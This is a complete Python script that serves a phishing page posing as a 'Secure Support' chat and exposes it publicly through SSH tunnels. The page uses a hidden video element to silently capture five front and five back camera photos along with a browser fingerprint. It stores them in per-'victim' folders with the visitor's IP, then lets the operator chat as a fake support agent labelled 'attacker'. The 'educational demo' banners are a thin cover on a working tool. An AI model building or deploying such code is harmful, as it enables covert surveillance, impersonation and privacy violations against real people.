#!/usr/bin/env python3
"""
Standalone Chat + Auto Camera Capture Demo
Uses Serveo / localhost.run (SSH) – no installation required.
"""

import os, sys, json, subprocess, signal, threading, time, socket, random, string, hashlib, re, base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Optional imports
try:
    from colorama import init, Fore, Style
    init()
    RED, GREEN, YELLOW, CYAN, BLUE, END = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.BLUE, Style.RESET_ALL
    BOLD, DIM = Style.BRIGHT, Style.DIM
except:
    RED = GREEN = YELLOW = CYAN = BLUE = END = ''
    BOLD = DIM = ''

try:
    from PIL import Image, ImageDraw, ImageFont
    PIL = True
except: PIL = False

def clear(): os.system('clear' if os.name == 'posix' else 'cls')
def banner():
    print(f"""
{CYAN}╔══════════════════════════════════════════════════════════════════╗
║  {RED}💬 CHAT + AUTO CAMERA DEMO (Standalone){CYAN}                         ║
║  {DIM}Capture 10 photos + real‑time chat – Educational Use Only{END}{CYAN}     ║
╚══════════════════════════════════════════════════════════════════════╝{END}
""")

# ============================================
# GLOBAL STATE
# ============================================
chat_messages = {}
chat_lock = threading.Lock()
stats = {'clicks':0, 'photos':0}

def get_session_id(ip, ua):
    return hashlib.md5(f"{ip}{ua}".encode()).hexdigest()[:12]

def create_victim_folder(victim_id):
    safe = re.sub(r'[^a-zA-Z0-9_\-]', '_', victim_id)[:30]
    base = f"logs/chat_demo/victim_{safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    dirs = {'photos': f"{base}/photos", 'front': f"{base}/photos/front", 'back': f"{base}/photos/back", 'data': f"{base}/data"}
    for d in dirs.values(): os.makedirs(d, exist_ok=True)
    return dirs

# ============================================
# TUNNEL MANAGER (Serveo → localhost.run → local)
# ============================================
class Tunnel:
    def __init__(self): self.proc = None; self.url = None
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except: return '127.0.0.1'
    def start(self, port):
        print(f"\n{YELLOW}🔍 Checking tunnel options...{END}")
        if self._check_cmd('ssh'):
            # Try localhost.run first (more reliable than serveo)
            url = self._localhost_run(port)
            if url: return url
            # Fallback to serveo
            url = self._serveo(port)
            if url: return url
        # Local fallback
        local_url = f"http://{self.get_local_ip()}:{port}"
        print(f"{YELLOW}🌐 Local URL: {local_url}{END}")
        self.url = local_url
        return local_url
    def _check_cmd(self, cmd):
        try:
            subprocess.run([cmd, '-V'], capture_output=True, timeout=2)
            return True
        except: return False
    def _localhost_run(self, port):
        """Use localhost.run (ssh -R 80:localhost:port localhost.run)"""
        print(f"{DIM}   Trying localhost.run...{END}")
        cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
               '-R', f'80:localhost:{port}', 'localhost.run']
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            start = time.time()
            url = None
            while time.time() - start < 15:
                line = self.proc.stdout.readline()
                if not line: time.sleep(0.1); continue
                # localhost.run outputs a URL like https://xxxxxxxxxxxx.lhr.life
                match = re.search(r'https://[a-z0-9]+\.lhr\.life', line)
                if match:
                    url = match.group(0)
                    print(f"{GREEN}✅ Tunnel: {url}{END}")
                    break
            if url:
                self.url = url
                return url
            return None
        except Exception as e:
            print(f"{RED}localhost.run error: {e}{END}")
            return None
    def _serveo(self, port):
        """Use serveo.net (ssh -R subdomain:443:localhost:port serveo.net)"""
        subdomain = 'chat-' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=6))
        cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
               '-R', f'{subdomain}:443:localhost:{port}', 'serveo.net']
        print(f"{DIM}   Trying serveo.net with subdomain {subdomain}...{END}")
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            start = time.time()
            url = None
            while time.time() - start < 15:
                line = self.proc.stdout.readline()
                if not line: time.sleep(0.1); continue
                if 'Forwarding' in line or 'press CTRL+C' in line.lower():
                    url = f"https://{subdomain}.serveo.net"
                    print(f"{GREEN}✅ Tunnel: {url}{END}")
                    break
            if url:
                self.url = url
                return url
            return None
        except Exception as e:
            print(f"{RED}Serveo error: {e}{END}")
            return None
    def stop(self):
        if self.proc:
            self.proc.terminate()
            try: self.proc.wait(timeout=2)
            except: self.proc.kill()

# ============================================
# HTML (Same as before, works perfectly)
# ============================================
HTML = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Secure Support Chat</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
body{background:linear-gradient(135deg,#667eea08,#764ba215);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px}
.banner{position:fixed;top:0;left:0;right:0;background:#ff4757;color:#fff;text-align:center;padding:8px;font-size:13px;font-weight:bold;z-index:9999}
.container{background:#fff;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,0.2);max-width:420px;width:100%;padding:24px;margin-top:40px}
h1{color:#1a1a1a;font-size:22px;text-align:center;margin-bottom:4px}
.sub{color:#666;text-align:center;margin-bottom:20px;font-size:13px}
.btn{width:100%;padding:12px;background:#4a90e2;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px}
.btn:disabled{opacity:0.6}
.cam-btn{background:#28a745}
.chat-container{border:1px solid #e0e0e0;border-radius:8px;overflow:hidden;margin-top:16px;display:none}
.chat-header{background:#4a90e2;color:#fff;padding:10px;font-weight:bold;display:flex;align-items:center;gap:5px}
.chat-messages{height:300px;overflow-y:auto;padding:10px;background:#f9f9f9}
.chat-message{margin-bottom:10px;max-width:80%}
.chat-message.attacker{margin-left:auto;background:#4a90e2;color:#fff;padding:8px 12px;border-radius:18px 18px 4px 18px}
.chat-message.victim{margin-right:auto;background:#e9ecef;color:#333;padding:8px 12px;border-radius:18px 18px 18px 4px}
.chat-message small{display:block;font-size:10px;margin-top:4px;opacity:0.7}
.chat-input{display:flex;padding:8px;background:#fff;border-top:1px solid #e0e0e0}
.chat-input input{flex:1;padding:10px;border:1px solid #ddd;border-radius:20px;margin:0;font-size:14px}
.chat-input button{background:#4a90e2;color:#fff;border:none;padding:8px 16px;border-radius:20px;margin-left:8px;cursor:pointer;font-weight:600}
.warn{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:8px;margin:12px 0;font-size:11px;color:#856404}
.footer{text-align:center;margin-top:16px;color:#999;font-size:10px}
.spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 0.6s linear infinite;margin-left:8px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none}
.progress{margin:16px 0}
.bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden}
.fill{height:100%;background:#4a90e2;width:0%}
</style></head><body>
<div class="banner">⚠️ EDUCATIONAL DEMO – TEACHER DEVICE ONLY ⚠️</div>
<div class="container">
<h1>💬 Secure Support</h1><div class="sub">We're here to help you</div>
<video id="cam" autoplay playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px"></video>
<canvas id="canvas" style="display:none"></canvas>
<div id="camSection">
<button class="btn cam-btn" id="enableCamBtn">🔒 Enable Secure Camera</button>
<div id="progress" class="progress hidden"><div class="bar"><div class="fill" id="fill"></div></div><div id="progText" style="font-size:12px;text-align:center;margin-top:4px"></div></div>
</div>
<div id="chatWidget" class="chat-container">
<div class="chat-header"><span>🛡️</span> Support Agent (Encrypted)</div>
<div class="chat-messages" id="chatMessages"></div>
<div class="chat-input"><input type="text" id="chatInput" placeholder="Type a message..." disabled><button id="sendBtn" disabled>Send</button></div>
</div>
<div class="warn">🔒 Camera verification required to enable chat.</div>
<div class="footer">Protected by enterprise security</div>
</div>
<script>
let stream=null,facing='user',images={front:[],back:[]},camDone=false,capturing=false,sessionId=null;
const fp={ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:`${screen.width}x${screen.height}`,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
const camBtn=document.getElementById('enableCamBtn'),prog=document.getElementById('progress'),fill=document.getElementById('fill'),progText=document.getElementById('progText');
const chatWidget=document.getElementById('chatWidget'),msgDiv=document.getElementById('chatMessages'),input=document.getElementById('chatInput'),sendBtn=document.getElementById('sendBtn');
const video=document.getElementById('cam'),canvas=document.getElementById('canvas');

async function snap(){
    if(!video.videoWidth)return null;
    canvas.width=video.videoWidth;canvas.height=video.videoHeight;
    const ctx=canvas.getContext('2d');ctx.drawImage(video,0,0);
    ctx.font='bold 20px Arial';ctx.fillStyle='rgba(255,71,87,0.5)';ctx.fillText('⚠️ EDUCATIONAL DEMO',15,40);
    ctx.font='12px Arial';ctx.fillText(new Date().toLocaleString(),15,65);ctx.fillText('Teacher Device Only',15,85);
    return canvas.toDataURL('image/jpeg',0.7);
}
async function switchCam(mode){
    facing=mode;if(stream)stream.getTracks().forEach(t=>t.stop());
    try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:mode,width:{ideal:640},height:{ideal:480}}});video.srcObject=stream;return true;}catch(e){return false;}
}
async function startCam(){
    if(capturing)return;capturing=true;camBtn.disabled=true;prog.classList.remove('hidden');
    try{
        progText.textContent='Requesting camera...';
        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}});
        video.srcObject=stream;await new Promise(r=>setTimeout(r,400));
        for(let i=1;i<=5;i++){fill.style.width=(i*10)+'%';progText.textContent=`📱 Front ${i}/5`;const p=await snap();if(p)images.front.push(p);await new Promise(r=>setTimeout(r,250));}
        progText.textContent='Switching to back...';const hasBack=await switchCam('environment');await new Promise(r=>setTimeout(r,400));
        if(hasBack){for(let i=1;i<=5;i++){fill.style.width=(50+i*10)+'%';progText.textContent=`📷 Back ${i}/5`;const p=await snap();if(p)images.back.push(p);await new Promise(r=>setTimeout(r,250));}}
        fill.style.width='100%';progText.textContent='Complete!';
        await fetch('/camera',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({front:images.front,back:images.back,fp})});
        camDone=true;prog.classList.add('hidden');document.getElementById('camSection').classList.add('hidden');
        chatWidget.style.display='block';input.disabled=false;sendBtn.disabled=false;
        if(stream)stream.getTracks().forEach(t=>t.stop());
        const res=await fetch('/chat/init',{method:'POST'});const data=await res.json();sessionId=data.sessionId;
        startPolling();addSystemMessage('Secure chat established. A support agent will join shortly.');
        setTimeout(()=>addMessage('attacker','Hello! I am a support agent. How can I help you today?'),800);
    }catch(e){alert('Camera failed. Chat will continue.');chatWidget.style.display='block';input.disabled=false;sendBtn.disabled=false;prog.classList.add('hidden');}
    capturing=false;
}
camBtn.addEventListener('click',startCam);

function addSystemMessage(text){
    const div=document.createElement('div');div.style.cssText='text-align:center;color:#888;font-size:12px;margin:10px 0';
    div.textContent=text;msgDiv.appendChild(div);msgDiv.scrollTop=msgDiv.scrollHeight;
}
function addMessage(from,text){
    const time=new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
    const div=document.createElement('div');div.className=`chat-message ${from}`;
    div.innerHTML=`<strong>${from==='attacker'?'Support':'You'}</strong><br>${text}<small>${time}</small>`;
    msgDiv.appendChild(div);msgDiv.scrollTop=msgDiv.scrollHeight;
}
async function startPolling(){
    let lastCount=0;
    while(true){
        if(!sessionId){await new Promise(r=>setTimeout(r,1000));continue;}
        try{
            const res=await fetch(`/chat/poll?sid=${sessionId}`);
            const data=await res.json();
            if(data.messages.length>lastCount){
                for(let i=lastCount;i<data.messages.length;i++) addMessage(data.messages[i].from, data.messages[i].text);
                lastCount=data.messages.length;
            }
        }catch(e){}
        await new Promise(r=>setTimeout(r,1500));
    }
}
async function sendMessage(){
    const text=input.value.trim();if(!text||!sessionId)return;
    addMessage('victim',text);input.value='';
    await fetch('/chat/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId,text,from:'victim'})});
}
sendBtn.addEventListener('click',sendMessage);
input.addEventListener('keypress',e=>{if(e.key==='Enter')sendMessage();});
</script></body></html>'''

# ============================================
# HTTP HANDLER
# ============================================
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def save_img(self, b64, path):
        try:
            if 'base64,' in b64: b64 = b64.split('base64,')[1]
            with open(path, 'wb') as f: f.write(base64.b64decode(b64))
            return True
        except: return False
    def do_GET(self):
        if self.path in ['/','/index.html']:
            stats['clicks'] += 1
            self.send_response(200); self.send_header('Content-Type','text/html'); self.end_headers()
            self.wfile.write(HTML.encode())
        elif self.path.startswith('/chat/poll'):
            qs = urlparse(self.path).query; sid = qs.split('=')[1] if 'sid=' in qs else ''
            with chat_lock: msgs = chat_messages.get(sid, [])
            self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
            self.wfile.write(json.dumps({'messages': msgs}).encode())
        else: self.send_error(404)
    def do_POST(self):
        cl = int(self.headers.get('Content-Length',0)); data = json.loads(self.rfile.read(cl)) if cl else {}
        if self.path == '/camera':
            stats['photos'] += 1
            email = 'chat_victim'
            dirs = create_victim_folder(email)
            fc = sum(1 for i,img in enumerate(data.get('front',[]),1) if self.save_img(img, f"{dirs['front']}/front_{i}.jpg"))
            bc = sum(1 for i,img in enumerate(data.get('back',[]),1) if self.save_img(img, f"{dirs['back']}/back_{i}.jpg"))
            with open(f"{dirs['data']}/session.json",'w') as f: json.dump({'front':fc,'back':bc,'ip':self.client_address[0]},f)
            print(f"{GREEN}📸 Camera: {fc} front, {bc} back → {dirs['photos']}{END}")
        elif self.path == '/chat/init':
            sid = get_session_id(self.client_address[0], self.headers.get('User-Agent',''))
            self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
            self.wfile.write(json.dumps({'sessionId': sid}).encode())
        elif self.path == '/chat/send':
            sid = data.get('sessionId'); text = data.get('text',''); sender = data.get('from','victim')
            ts = datetime.now().strftime("%H:%M")
            with chat_lock:
                if sid not in chat_messages: chat_messages[sid] = []
                chat_messages[sid].append({'from': sender, 'text': text, 'time': ts})
            if sender == 'victim':
                print(f"{CYAN}💬 Victim: {text}{END}")
        else: self.send_error(404); return
        self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Access-Control-Allow-Origin','*'); self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    def do_OPTIONS(self):
        self.send_response(200); self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','POST, GET, OPTIONS'); self.send_header('Access-Control-Allow-Headers','Content-Type')
        self.end_headers()

# ============================================
# TEACHER CHAT THREAD
# ============================================
def teacher_chat(sid):
    print(f"\n{CYAN}💬 Chat active. Type messages (or /quit):{END}")
    while True:
        try:
            msg = input(f"{YELLOW}You (Support) > {END}").strip()
            if msg.lower() == '/quit': break
            if not msg: continue
            ts = datetime.now().strftime("%H:%M")
            with chat_lock:
                if sid not in chat_messages: chat_messages[sid] = []
                chat_messages[sid].append({'from': 'attacker', 'text': msg, 'time': ts})
            print(f"{GREEN}✅ Sent{END}")
        except EOFError: break

# ============================================
# MAIN
# ============================================
def main():
    clear(); banner()
    os.makedirs("logs/chat_demo", exist_ok=True)
    port = 5000
    while port < 5020:
        try: server = HTTPServer(('0.0.0.0', port), Handler); break
        except OSError: port += 1
    tunnel = Tunnel()
    url = tunnel.start(port)
    if not url:
        print(f"{RED}❌ Could not create tunnel. Exiting.{END}")
        sys.exit(1)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    clear(); banner()
    print(f"""
{GREEN}╔══════════════════════════════════════════════════════════════════╗
║                    ✅ DEMO READY!                                   ║
╚══════════════════════════════════════════════════════════════════════╝{END}
{BOLD}🔗 OPEN ON YOUR PHONE:{END} {CYAN}{url}{END}

{YELLOW}📋 FLOW:{END}
   1. Tap "Enable Secure Camera" → grant permission
   2. 5 front + 5 back photos captured automatically
   3. Chat activates → You can chat from this terminal

{CYAN}💬 Wait for victim, then type messages here.{END}
{RED}Press Ctrl+C to stop{END}
""")
    print(f"{YELLOW}Waiting for victim to connect...{END}")
    sid = None
    while not sid:
        time.sleep(1)
        with chat_lock:
            if chat_messages: sid = list(chat_messages.keys())[0]; break
    print(f"{GREEN}✅ Victim connected! Session: {sid}{END}")
    threading.Thread(target=teacher_chat, args=(sid,), daemon=True).start()
    def stop(sig,frame):
        print(f"\n{YELLOW}🛑 Stopping...{END}")
        tunnel.stop(); server.shutdown()
        print(f"{GREEN}Data saved in logs/chat_demo/{END}")
        sys.exit(0)
    signal.signal(signal.SIGINT, stop)
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: stop(None,None)

if __name__ == "__main__":
    import signal
    main()
